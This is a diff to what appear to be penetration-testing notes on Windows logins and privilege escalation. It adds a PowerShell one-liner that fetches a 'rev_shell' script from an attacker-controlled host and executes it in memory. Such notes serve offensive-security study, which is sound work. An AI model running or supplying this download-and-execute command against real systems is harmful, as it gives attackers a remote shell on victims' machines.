@@ -144,6 +144,13 @@ We can try doing remote logins with useranmes and passwords using a script from 
 
 	https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 
+
+## Other Info
+
+Download and execute file using powershell:
+
+	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'
+
 ## More info
 
 	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
